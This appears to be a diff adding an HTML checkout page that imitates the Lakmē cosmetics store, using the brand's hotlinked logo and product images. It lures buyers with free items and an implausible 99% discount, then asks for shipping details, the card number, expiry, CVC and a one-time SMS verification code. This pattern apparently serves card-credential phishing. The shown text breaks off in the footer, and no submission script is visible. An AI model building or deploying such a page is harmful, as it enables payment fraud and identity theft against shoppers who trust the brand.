@@ -1,0 +1,1190 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link
+      rel="stylesheet"
+      href="https://cdn.jsdelivr.net/npm/rippleui@1.12.1/dist/css/styles.css"
+    />
+    <script>
+      tailwind.config = {
+        theme: {
+          extend: {
+            colors: {
+              primary: "#901913",
+              secondary: "#191A1A",
+            },
+          },
+        },
+      };
+    </script>
+    <title>Lakmē | All Day Base Set</title>
+  </head>
+  <body class="bg-white">
+    <div class="bg-secondary">
+      <!--
+        Mobile menu
+    
+        Off-canvas menu for mobile, show/hide based on off-canvas menu state.
+      -->
+      <div class="relative z-40 lg:hidden" role="dialog" aria-modal="true">
+        <!--
+          Off-canvas menu backdrop, show/hide based on off-canvas menu state.
+    
+          Entering: "transition-opacity ease-linear duration-300"
+            From: "opacity-0"
+            To: "opacity-100"
+          Leaving: "transition-opacity ease-linear duration-300"
+            From: "opacity-100"
+            To: "opacity-0"
+        -->
+        
+      </div>
+
+      <header class="relative bg-secondary">
+        <p
+          class="flex h-10 items-center justify-center bg-primary px-4 text-sm font-medium text-white sm:px-6 lg:px-8"
+        >
+          Get free delivery on orders over $100
+        </p>
+
+        <nav aria-label="Top" class="mx-auto max-w-7xl px-4 sm:px-6 lg:px-8">
+          <div class="border-b border-gray-200">
+            <div class="flex h-16 items-center">
+              <!-- Mobile menu toggle, controls the 'mobileMenuOpen' state. -->
+              <button
+                type="button"
+                class="relative rounded-md bg-secondary p-2 text-gray-400 lg:hidden"
+              >
+                <span class="absolute -inset-0.5"></span>
+                <span class="sr-only">Open menu</span>
+                <svg
+                  class="h-6 w-6"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke-width="1.5"
+                  stroke="currentColor"
+                  aria-hidden="true"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M3.75 6.75h16.5M3.75 12h16.5m-16.5 5.25h16.5"
+                  />
+                </svg>
+              </button>
+
+              <!-- Logo -->
+              <div class="ml-4 flex lg:ml-0">
+                <a href="#">
+                  <img
+                    src="https://www.lakmeindia.com/cdn/shop/files/Lkm1_1_47aec8f4-69ca-4d80-be5f-b941bc1bf140_155x.png"
+                  />
+                </a>
+              </div>
+
+              <!-- Flyout menus -->
+              <div class="hidden lg:ml-8 lg:block lg:self-stretch">
+                <div class="flex h-full space-x-8">
+                  <div class="flex">
+                    <div class="relative flex">
+                      <!-- Item active: "border-indigo-600 text-secondary", Item inactive: "border-transparent text-white hover:text-gray-300" -->
+                      <button
+                        type="button"
+                        class="border-transparent text-white hover:text-gray-300 relative z-10 -mb-px flex items-center border-b-2 pt-px text-sm font-medium transition-colors duration-200 ease-out"
+                        aria-expanded="false"
+                      >
+                        CATEGORIES
+                      </button>
+                    </div>
+
+                    <!--
+                      'Women' flyout menu, show/hide based on flyout menu state.
+    
+                      Entering: "transition ease-out duration-200"
+                        From: "opacity-0"
+                        To: "opacity-100"
+                      Leaving: "transition ease-in duration-150"
+                        From: "opacity-100"
+                        To: "opacity-0"
+                    -->
+                  </div>
+                  <div class="flex">
+                    <div class="relative flex">
+                      <!-- Item active: "border-indigo-600 text-secondary", Item inactive: "border-transparent text-white hover:text-gray-300" -->
+                      <button
+                        type="button"
+                        class="border-transparent text-white hover:text-gray-300 relative z-10 -mb-px flex items-center border-b-2 pt-px text-sm font-medium transition-colors duration-200 ease-out"
+                        aria-expanded="false"
+                      >
+                        TRENDING NOW
+                      </button>
+                    </div>
+
+                    <!--
+                      'Men' flyout menu, show/hide based on flyout menu state.
+    
+                      Entering: "transition ease-out duration-200"
+                        From: "opacity-0"
+                        To: "opacity-100"
+                      Leaving: "transition ease-in duration-150"
+                        From: "opacity-100"
+                        To: "opacity-0"
+                    -->
+                  </div>
+
+                  <a
+                    href="#"
+                    class="flex items-center text-sm font-medium text-white hover:text-gray-300"
+                    >COMBOS</a
+                  >
+                  <a
+                    href="#"
+                    class="flex items-center text-sm font-medium text-white hover:text-gray-300"
+                    >BLOG</a
+                  >
+                </div>
+              </div>
+
+              <div class="ml-auto flex items-center">
+                <div
+                  class="hidden lg:flex lg:flex-1 lg:items-center lg:justify-end lg:space-x-6"
+                >
+                  <a
+                    href="#"
+                    class="text-sm font-medium text-white hover:text-gray-300"
+                    >Sign in</a
+                  >
+                  <span class="h-6 w-px bg-gray-200" aria-hidden="true"></span>
+                </div>
+
+                <!-- Search -->
+                <div class="flex lg:ml-6">
+                  <a href="#" class="p-2 text-gray-400 hover:text-gray-500">
+                    <span class="sr-only">Search</span>
+                    <svg
+                      class="h-6 w-6"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke-width="1.5"
+                      stroke="currentColor"
+                      aria-hidden="true"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M21 21l-5.197-5.197m0 0A7.5 7.5 0 105.196 5.196a7.5 7.5 0 0010.607 10.607z"
+                      />
+                    </svg>
+                  </a>
+                </div>
+
+                <!-- Cart -->
+                <div class="ml-4 flow-root lg:ml-6">
+                  <a href="#" class="group -m-2 flex items-center p-2">
+                    <svg
+                      class="h-6 w-6 flex-shrink-0 text-gray-400 group-hover:text-gray-500"
+                      fill="none"
+                      viewBox="0 0 24 24"
+                      stroke-width="1.5"
+                      stroke="currentColor"
+                      aria-hidden="true"
+                    >
+                      <path
+                        stroke-linecap="round"
+                        stroke-linejoin="round"
+                        d="M15.75 10.5V6a3.75 3.75 0 10-7.5 0v4.5m11.356-1.993l1.263 12c.07.665-.45 1.243-1.119 1.243H4.25a1.125 1.125 0 01-1.12-1.243l1.264-12A1.125 1.125 0 015.513 7.5h12.974c.576 0 1.059.435 1.119 1.007zM8.625 10.5a.375.375 0 11-.75 0 .375.375 0 01.75 0zm7.5 0a.375.375 0 11-.75 0 .375.375 0 01.75 0z"
+                      />
+                    </svg>
+                    <span
+                      class="ml-2 text-sm font-medium text-white group-hover:text-gray-300"
+                      >5</span
+                    >
+                    <span class="sr-only">items in cart, view bag</span>
+                  </a>
+                </div>
+              </div>
+            </div>
+          </div>
+        </nav>
+      </header>
+    </div>
+
+    
+    
+    
+    
+    
+    
+    
+    
+    <div
+      class="flex flex-col items-center border-b bg-white py-4 sm:flex-row sm:px-10 lg:px-20 xl:px-32"
+    >
+      <div class="mt-4 py-2 text-xs sm:mt-0 sm:ml-auto sm:text-base">
+        <div class="relative">
+          <ul
+            class="relative flex w-full items-center justify-between space-x-2 sm:space-x-4"
+          >
+            <li class="flex items-center space-x-3 text-left sm:space-x-4">
+              <a
+                class="flex h-6 w-6 items-center justify-center rounded-full bg-emerald-200 text-xs font-semibold text-black text-emerald-700"
+                href="#"
+                ><svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="h-4 w-4"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                  stroke-width="2"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M5 13l4 4L19 7"
+                  /></svg></a>
+              <span class="font-semibold text-black text-gray-900">Shop</span>
+            </li>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="h-4 w-4 text-gray-400"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              stroke-width="2"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M9 5l7 7-7 7"
+              />
+            </svg>
+            <li class="flex items-center space-x-3 text-left sm:space-x-4">
+              <a
+                class="flex h-6 w-6 items-center justify-center rounded-full bg-gray-600 text-xs font-semibold text-black text-white ring ring-gray-600 ring-offset-2"
+                href="#"
+                >2</a
+              >
+              <span class="font-semibold text-black text-gray-900"
+                >Shipping &amp; Payment</span
+              >
+            </li>
+            <svg
+              xmlns="http://www.w3.org/2000/svg"
+              class="h-4 w-4 text-gray-400"
+              fill="none"
+              viewBox="0 0 24 24"
+              stroke="currentColor"
+              stroke-width="2"
+            >
+              <path
+                stroke-linecap="round"
+                stroke-linejoin="round"
+                d="M9 5l7 7-7 7"
+              />
+            </svg>
+            <li class="flex items-center space-x-3 text-left sm:space-x-4">
+              <a
+                class="flex h-6 w-6 items-center justify-center rounded-full bg-gray-400 text-xs font-semibold text-black text-white"
+                href="#"
+                >3</a
+              >
+              <span class="font-semibold text-black text-gray-500"
+                >Confirmation</span
+              >
+            </li>
+          </ul>
+        </div>
+      </div>
+    </div>
+    <div class="grid sm:px-10 lg:grid-cols-2 lg:px-20 xl:px-32">
+      <div class="px-4 pt-8">
+        <p class="text-xl font-medium text-black">Order Summary</p>
+        <p class="text-gray-400">
+          Check your items. And select a suitable shipping method.
+        </p>
+        <div
+          class="mt-8 space-y-3 rounded-lg border bg-white px-2 py-4 sm:px-6"
+        >
+          <div class="flex flex-col rounded-lg bg-white sm:flex-row">
+            <img
+              class="m-2 h-24 w-28 rounded-md border object-cover object-center"
+              src="https://cdn.shopify.com/s/files/1/0014/3514/0183/products/LakmeAbsoluteBlurPerfectPrimer_0194733a-3433-4de0-b51c-fced6ee71032_small.jpg?v=1663055515"
+              alt=""
+            />
+            <div class="flex w-full flex-col px-4 py-4 justify-between">
+              <span class="font-semibold text-black"
+                >Lakmē Absolute Blur Perfect Primer 1.5 gm</span
+              >
+              <p class="text-lg font-bold text-black">Free</p>
+            </div>
+          </div>
+          <div class="flex flex-col rounded-lg bg-white sm:flex-row">
+            <img
+              class="m-2 h-24 w-28 rounded-md border object-cover object-center"
+              src="https://cdn.shopify.com/s/files/1/0014/3514/0183/files/WhatsAppImage2021-12-20at4.48.32PM_small.jpg?v=1683281368"
+              alt=""
+            />
+            <div class="flex w-full flex-col px-4 py-4">
+              <span class="font-semibold text-black">Makeup Brush</span>
+              <p class="mt-auto text-lg font-bold text-black">Free</p>
+            </div>
+          </div>
+          <div class="flex flex-col rounded-lg bg-white sm:flex-row">
+            <img
+              class="m-2 h-24 w-28 rounded-md border object-cover object-center"
+              src="https://cdn.shopify.com/s/files/1/0014/3514/0183/products/29204_H1-8901030867583_7b1b3e84-8898-4c8a-9fee-8faa598ca40e_small.jpg?v=1653656911"
+              alt=""
+            />
+            <div class="flex w-full flex-col px-4 py-4">
+              <span class="font-semibold text-black"
+                >Lakmē Absolute Made to Last Setting Spray 60ml</span
+              >
+              <span class="float-right text-gray-400">Primer</span>
+              <p class="mt-auto text-lg font-bold text-black">&#8377;489.00</p>
+            </div>
+          </div>
+          <div class="flex flex-col rounded-lg bg-white sm:flex-row">
+            <img
+              class="m-2 h-24 w-28 rounded-md border object-cover object-center"
+              src="https://cdn.shopify.com/s/files/1/0014/3514/0183/products/24456_S1-8901030742750_97cebebf-fa0f-4544-ad92-bdc865638bd3_small.jpg?v=1668858512"
+              alt=""
+            />
+            <div class="flex w-full flex-col px-4 py-4">
+              <span class="font-semibold text-black"
+                >Lakmē 9 to 5 Primer + Matte Perfect Cover Foundation</span
+              >
+              <span id="shade1" class="float-right text-gray-400">[SELECTION]</span>
+              <p class="mt-auto text-lg font-bold text-black">&#8377;440.00</p>
+            </div>
+          </div>
+          <div class="flex flex-col rounded-lg bg-white sm:flex-row">
+            <img
+              class="m-2 h-24 w-28 rounded-md border object-cover object-center"
+              src="https://cdn.shopify.com/s/files/1/0014/3514/0183/products/CONCEALERchestnut_fop_swatch_5b358573-8884-463d-bd9c-b1b2c347e64f_small.jpg?v=1653656826"
+              alt=""
+            />
+            <div class="flex w-full flex-col px-4 py-4">
+              <span class="font-semibold text-black"
+                >Lakmē 9to5 Primer + Matte Liquid Concealer</span
+              >
+              <span id="shade0" class="float-right text-gray-400">[SELECTION]</span>
+              <p class="mt-auto text-lg font-bold text-black">&#8377;370.00</p>
+            </div>
+          </div>
+        </div>
+
+        <p class="mt-8 text-lg font-medium text-black">Shipping Methods</p>
+          <div class="relative my-3">
+            <input
+              class="peer hidden"
+              id="radio_1"
+              type="radio"
+              name="radio"
+              disabled
+            />
+            <span
+              class="peer-checked:border-gray-700 absolute right-4 top-1/2 box-content block h-3 w-3 -translate-y-1/2 rounded-full border-8 border-gray-300 bg-white"
+            ></span>
+            <label
+              class="peer-checked:border-2 peer-checked:border-gray-700 peer-checked:bg-gray-50 flex cursor-pointer select-none rounded-lg border border-gray-300 p-4"
+              for="radio_1"
+            >
+              <div class="ml-5">
+                <span class="mt-2 font-semibold text-gray-500"
+                  >Cash on Delivery (COD)</span
+                >
+                <p class="text-slate-500 text-sm leading-6">
+                  Unavailable
+                </p>
+              </div>
+            </label>
+          </div>
+          <div class="relative">
+            <input
+              class="peer hidden"
+              id="radio_2"
+              type="radio"
+              name="radio"
+              checked
+            />
+            <span
+              class="peer-checked:border-gray-700 absolute right-4 top-1/2 box-content block h-3 w-3 -translate-y-1/2 rounded-full border-8 border-gray-300 bg-white"
+            ></span>
+            <label
+              class="peer-checked:border-2 peer-checked:border-gray-700 peer-checked:bg-gray-50 flex cursor-pointer select-none rounded-lg border border-gray-300 p-4"
+              for="radio_2"
+            >
+              <div class="ml-5">
+                <span class="mt-2 font-semibold text-black"
+                  >Credit/Debit Card</span
+                >
+                <p class="text-slate-500 text-sm leading-6">
+                  Selected
+                </p>
+              </div>
+            </label>
+          </div>
+      </div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+      <div class="mt-10 bg-gray-50 px-4 pt-8 lg:mt-0">
+        <div class="change flex-col" id="shipping" style="display: flex;">
+          <p class="text-xl font-medium text-black">Shipping Details</p>
+          <p class="text-gray-400">
+            Complete your order by providing your shipping details.
+          </p>
+          <div class="flex flex-col gap-3 my-5">
+            <div class="relative flex flex-row gap-2">
+              <input
+                type="text"
+                id="fname"
+                name="fname"
+                class="queryInput bg-white text-black w-1/2 rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="First Name*"
+                value=""
+                maxlength="50"
+              />
+              <input
+                type="text"
+                id="lname"
+                name="lname"
+                class="queryInput bg-white text-black w-1/2 rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Last Name*"
+                value=""
+                maxlength="50"
+              />
+            </div>
+            <div class="relative">
+              <input
+                type="tel"
+                id="phone"
+                name="phone"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Phone Number*"
+                value=""
+                maxlength="10"
+              />
+            </div>
+            <div class="relative">
+              <input
+                type="text"
+                id="address1"
+                name="address1"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Address Line 1*"
+                value=""
+                maxlength="100"
+              />
+            </div>
+            <div class="relative">
+              <input
+                type="text"
+                id="address2"
+                name="address2"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Address Line 2"
+                value=""
+                maxlength="100"
+              />
+            </div>
+            <div class="relative">
+              <input
+                type="text"
+                id="billing-city"
+                name="billing-city"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="City*"
+                value=""
+                maxlength="50"
+              />
+            </div>
+            <div class="flex flex-col sm:flex-row gap-2">
+              <div class="relative flex-shrink-0 sm:w-7/12">
+                <input
+                  type="text"
+                  id="billing-country"
+                  name="billing-country"
+                  class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-11 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                  placeholder="India"
+                  value="India"
+                  disabled
+                />
+                <div
+                  class="pointer-events-none absolute inset-y-0 left-0 inline-flex items-center px-3"
+                >
+                  <img
+                    class="h-4 w-4 object-contain"
+                    src="https://flagpack.xyz/_nuxt/43d56f605a4ad41c190b7798a99c53bf.svg"
+                    alt=""
+                  />
+                </div>
+              </div>
+              <select
+                type="text"
+                id="billing-state"
+                name="billing-state"
+                value=""
+                class="bg-white text-gray-400 w-full rounded-md border border-gray-200 px-4 py-3 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+              >
+                <option value="State">State*</option>
+                <option value="AP">Andhra Pradesh</option>
+                <option value="AR">Arunachal Pradesh</option>
+                <option value="AS">Assam</option>
+                <option value="BR">Bihar</option>
+                <option value="CT">Chhattisgarh</option>
+                <option value="GA">Gujarat</option>
+                <option value="HR">Haryana</option>
+                <option value="HP">Himachal Pradesh</option>
+                <option value="JK">Jammu and Kashmir</option>
+                <option value="GA">Goa</option>
+                <option value="JH">Jharkhand</option>
+                <option value="KA">Karnataka</option>
+                <option value="KL">Kerala</option>
+                <option value="MP">Madhya Pradesh</option>
+                <option value="MH">Maharashtra</option>
+                <option value="MN">Manipur</option>
+                <option value="ML">Meghalaya</option>
+                <option value="MZ">Mizoram</option>
+                <option value="NL">Nagaland</option>
+                <option value="OR">Odisha</option>
+                <option value="PB">Punjab</option>
+                <option value="RJ">Rajasthan</option>
+                <option value="SK">Sikkim</option>
+                <option value="TN">Tamil Nadu</option>
+                <option value="TG">Telangana</option>
+                <option value="TR">Tripura</option>
+                <option value="UT">Uttarakhand</option>
+                <option value="UP">Uttar Pradesh</option>
+                <option value="WB">West Bengal</option>
+                <option value="AN">Andaman and Nicobar Islands</option>
+                <option value="CH">Chandigarh</option>
+                <option value="DN">Dadra and Nagar Haveli</option>
+                <option value="DD">Daman and Diu</option>
+                <option value="DL">Delhi</option>
+                <option value="LD">Lakshadweep</option>
+                <option value="PY">Puducherry</option>
+              </select>
+              <input
+                type="text"
+                name="billing-zip"
+                id="billing-zip"
+                class="queryInput bg-white flex-shrink-0 rounded-md border border-gray-200 px-4 py-3 text-sm text-black shadow-sm outline-none sm:w-1/6 focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="ZIP*"
+                value=""
+                maxlength="6"
+              />
+            </div>
+
+            <!-- Total -->
+            <div class="mt-6 border-t border-b py-2">
+              <div class="flex items-center justify-between">
+                <p class="text-sm font-medium text-black text-gray-900">
+                  Subtotal
+                </p>
+                <p class="font-semibold text-black text-gray-900">&#8377;1,299.00</p>
+              </div>
+              <div class="flex items-center justify-between">
+                <p class="text-sm font-medium text-black text-gray-900">
+                  Shipping
+                </p>
+                <p class="font-semibold text-black text-gray-900">&#8377;60.00</p>
+              </div>
+              <div class="flex items-center justify-between mt-2">
+                  <p class="text-sm font-medium text-black text-gray-900">
+                    Discount (-99%)
+                  </p>
+                  <p class="font-semibold text-black text-green-700">- &#8377;1,289.00</p>
+                </div>
+            </div>
+            <div class="mt-6 flex items-center justify-between">
+              <p class="text-sm font-medium text-black text-gray-900">Total</p>
+              <p class="text-2xl font-semibold text-black text-gray-900">
+                  &#8377;61.00
+              </p>
+            </div>
+
+          </div>
+        </div>
+        <div class="change flex-col" id="payment" style="display: none;">
+          <div class="mb-5 pb-5 bg-gray-50 pt-0 lg:mt-0 border-b border-b-1">
+            <div class="change flex-col" id="shipping" style="display: flex;">
+              <p class="text-xl font-medium text-black">Shipping Details</p>
+              <p class="text-gray-400" id="shippingShortName"></p>
+              <p class="text-gray-400" id="shippingShortPhone"></p>
+              <p class="text-gray-400" id="shippingShortAddress"></p>
+              <p class="text-primary cursor-pointer underline" id="editBtn">Edit</p>
+            </div>
+          </div>
+          <p class="text-xl font-medium text-black">Payment Details</p>
+          <p class="text-gray-400">
+            Complete your order by providing your payment details.
+          </p>
+          <div class="flex flex-col gap-3 my-5">
+            <div class="relative">
+              <input
+                type="text"
+                id="email"
+                name="email"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-11 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Email"
+                value=""
+                maxlength="100"
+              />
+              <div
+                class="pointer-events-none absolute inset-y-0 left-0 inline-flex items-center px-3"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="h-4 w-4 text-gray-400"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                  stroke-width="2"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M16 12a4 4 0 10-8 0 4 4 0 008 0zm0 0v1.5a2.5 2.5 0 005 0V12a9 9 0 10-9 9m4.5-1.206a8.959 8.959 0 01-4.5 1.207"
+                  />
+                </svg>
+              </div>
+            </div>
+            <div class="relative">
+              <input
+                type="text"
+                id="card-holder"
+                name="card-holder"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-11 text-sm uppercase shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="Full Name"
+                value=""
+                maxlength="50"
+              />
+              <div
+                class="pointer-events-none absolute inset-y-0 left-0 inline-flex items-center px-3"
+              >
+                <svg
+                  xmlns="http://www.w3.org/2000/svg"
+                  class="h-4 w-4 text-gray-400"
+                  fill="none"
+                  viewBox="0 0 24 24"
+                  stroke="currentColor"
+                  stroke-width="2"
+                >
+                  <path
+                    stroke-linecap="round"
+                    stroke-linejoin="round"
+                    d="M15 9h3.75M15 12h3.75M15 15h3.75M4.5 19.5h15a2.25 2.25 0 002.25-2.25V6.75A2.25 2.25 0 0019.5 4.5h-15a2.25 2.25 0 00-2.25 2.25v10.5A2.25 2.25 0 004.5 19.5zm6-10.125a1.875 1.875 0 11-3.75 0 1.875 1.875 0 013.75 0zm1.294 6.336a6.721 6.721 0 01-3.17.789 6.721 6.721 0 01-3.168-.789 3.376 3.376 0 016.338 0z"
+                  />
+                </svg>
+              </div>
+            </div>
+            <div class="flex gap-2">
+              <div class="relative w-7/12 flex-shrink-0">
+                <input
+                  type="text"
+                  id="card-no"
+                  name="card-no"
+                  class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-2 py-3 pl-11 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                  placeholder="Card Number"
+                  value=""
+                  maxlength="19"
+                />
+                <div
+                  class="pointer-events-none absolute inset-y-0 left-0 inline-flex items-center px-3"
+                >
+                  <svg
+                    class="h-4 w-4 text-gray-400"
+                    xmlns="http://www.w3.org/2000/svg"
+                    width="16"
+                    height="16"
+                    fill="currentColor"
+                    viewBox="0 0 16 16"
+                  >
+                    <path
+                      d="M11 5.5a.5.5 0 0 1 .5-.5h2a.5.5 0 0 1 .5.5v1a.5.5 0 0 1-.5.5h-2a.5.5 0 0 1-.5-.5v-1z"
+                    />
+                    <path
+                      d="M2 2a2 2 0 0 0-2 2v8a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V4a2 2 0 0 0-2-2H2zm13 2v5H1V4a1 1 0 0 1 1-1h12a1 1 0 0 1 1 1zm-1 9H2a1 1 0 0 1-1-1v-1h14v1a1 1 0 0 1-1 1z"
+                    />
+                  </svg>
+                </div>
+              </div>
+              <input
+                type="text"
+                id="card-expiry"
+                name="card-expiry"
+                class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-2 py-3 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="MM/YY"
+                value=""
+                maxlength="5"
+              />
+              <input
+                type="tel"
+                id="card-cvc"
+                name="card-cvc"
+                class="queryInput bg-white w-1/6 flex-shrink-0 rounded-md border border-gray-200 px-2 py-3 text-sm text-black shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="CVC"
+                value=""
+                maxlength="3"
+              />
+            </div>
+            <label
+              for="billing-address"
+              class="mt-4 mb-2 block text-sm font-medium text-black"
+              >Billing Address</label
+            >
+            <div class="flex flex-row gap-2">
+              <input type="checkbox" name="billing-addy" id="billing-addy" checked>
+              <label for="billing-addy" class="text-sm text-gray-500">Same as shipping address</label>
+            </div>
+            <div id="addressContainer" class="flex flex-col sm:flex-row gap-2" style="display: none;">
+              <div class="relative flex-shrink-0 sm:w-7/12">
+                <input
+                  type="text"
+                  id="billing-address"
+                  name="billing-address"
+                  class="bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-11 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                  placeholder="Street Address"
+                />
+                <div
+                  class="pointer-events-none absolute inset-y-0 left-0 inline-flex items-center px-3"
+                >
+                  <img
+                    class="h-4 w-4 object-contain"
+                    src="https://flagpack.xyz/_nuxt/43d56f605a4ad41c190b7798a99c53bf.svg"
+                    alt=""
+                  />
+                </div>
+              </div>
+              <select
+                type="text"
+                name="billing-state"
+                class="bg-white text-gray-400 w-full rounded-md border border-gray-200 px-4 py-3 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+              >
+                <option value="State">State</option>
+                <option value="State">State</option>
+                <option value="AP">Andhra Pradesh</option>
+                <option value="AR">Arunachal Pradesh</option>
+                <option value="AS">Assam</option>
+                <option value="BR">Bihar</option>
+                <option value="CT">Chhattisgarh</option>
+                <option value="GA">Gujarat</option>
+                <option value="HR">Haryana</option>
+                <option value="HP">Himachal Pradesh</option>
+                <option value="JK">Jammu and Kashmir</option>
+                <option value="GA">Goa</option>
+                <option value="JH">Jharkhand</option>
+                <option value="KA">Karnataka</option>
+                <option value="KL">Kerala</option>
+                <option value="MP">Madhya Pradesh</option>
+                <option value="MH">Maharashtra</option>
+                <option value="MN">Manipur</option>
+                <option value="ML">Meghalaya</option>
+                <option value="MZ">Mizoram</option>
+                <option value="NL">Nagaland</option>
+                <option value="OR">Odisha</option>
+                <option value="PB">Punjab</option>
+                <option value="RJ">Rajasthan</option>
+                <option value="SK">Sikkim</option>
+                <option value="TN">Tamil Nadu</option>
+                <option value="TG">Telangana</option>
+                <option value="TR">Tripura</option>
+                <option value="UT">Uttarakhand</option>
+                <option value="UP">Uttar Pradesh</option>
+                <option value="WB">West Bengal</option>
+                <option value="AN">Andaman and Nicobar Islands</option>
+                <option value="CH">Chandigarh</option>
+                <option value="DN">Dadra and Nagar Haveli</option>
+                <option value="DD">Daman and Diu</option>
+                <option value="DL">Delhi</option>
+                <option value="LD">Lakshadweep</option>
+                <option value="PY">Puducherry</option>
+              </select>
+              <input
+                type="text"
+                name="billing-zip"
+                class="bg-white flex-shrink-0 rounded-md border border-gray-200 px-4 py-3 text-sm shadow-sm outline-none sm:w-1/6 focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+                placeholder="ZIP"
+              />
+            </div>
+          </div>
+
+          <!-- Total -->
+          <div class="mt-6 border-t border-b py-2">
+            <div class="flex items-center justify-between">
+              <p class="text-sm font-medium text-black text-gray-900">
+                Subtotal
+              </p>
+              <p class="font-semibold text-black text-gray-900">&#8377;1,299.00</p>
+            </div>
+            <div class="flex items-center justify-between">
+              <p class="text-sm font-medium text-black text-gray-900">
+                Shipping
+              </p>
+              <p class="font-semibold text-black text-gray-900">&#8377;60.00</p>
+            </div>
+            <div class="flex items-center justify-between mt-2">
+                <p class="text-sm font-medium text-black text-gray-900">
+                  Discount (-99%)
+                </p>
+                <p class="font-semibold text-black text-green-700">- &#8377;1,289.00</p>
+              </div>
+          </div>
+          <div class="mt-6 flex items-center justify-between">
+            <p class="text-sm font-medium text-black text-gray-900">Total</p>
+            <p class="text-2xl font-semibold text-black text-gray-900">
+                &#8377;61.00
+            </p>
+          </div>
+        </div>
+
+        <div class="change flex-col" id="verification" style="display: none;">
+          <div class="mb-5 pb-5 bg-gray-50 pt-0 lg:mt-0 border-b border-b-1">
+            <div class="change flex-col" id="shipping" style="display: flex;">
+              <p class="text-xl font-medium text-black">Payment Details</p>
+              <p class="text-gray-400" id="billingShortName"></p>
+              <p class="text-gray-400" id="billingShortNo"></p>
+              <p class="text-gray-400" id="billingShortExp"></p>
+            </div>
+          </div>
+
+          <p class="text-xl font-medium text-black">Verification Code</p>
+          <p class="text-gray-400">
+            A verification code has been sent to your phone number.
+          </p>
+
+          <div class="relative my-5">
+            <input
+              type="tel"
+              id="otp"
+              name="otp"
+              class="queryInput bg-white text-black w-full rounded-md border border-gray-200 px-4 py-3 pl-5 text-sm shadow-sm outline-none focus:z-10 focus:border-blue-500 focus:ring-blue-500"
+              placeholder="Enter OTP"
+              value=""
+              max="8"
+            />
+          </div>
+
+          <p class="text-gray-400">
+            Didn't recieve a code? <span class="text-primary underline">Resend</span>
+          </p>
+        </div>
+
+        <button data-step="0" id="continueBtn"
+          class="btn mt-4 mb-8 w-full rounded-md bg-primary px-6 py-5 font-medium text-black text-white"
+        >
+          Proceed to Payment
+        </button>
+      </div>
+    </div>
+
+
+
+
+
+    <footer class="bg-secondary shadow p-4 mt-10">
+        <div class="w-full max-w-screen-xl mx-auto p-4 md:py-8">
+          <div class="sm:flex sm:items-center sm:justify-between">
+            <a
+              href="https://flowbite.com/"
+              class="flex items-center mb-4 sm:mb-0 space-x-3 rtl:space-x-reverse"
+            >
+              <img
+                src="https://www.lakmeindia.com/cdn/shop/files/Lkm1_1_47aec8f4-69ca-4d80-be5f-b941bc1bf140_155x.png"
+                class="h-8"
+                alt="Flowbite Logo"
+              />
+            </a>
+            <ul
+              class="flex flex-wrap items-center mb-6 text-sm font-medium text-gray-500 sm:mb-0 dark:text-gray-400"
+            >
+              <li>
+                <a href="#" class="hover:underline me-4 md:me-6">About</a>
+              </li>
+              <li>
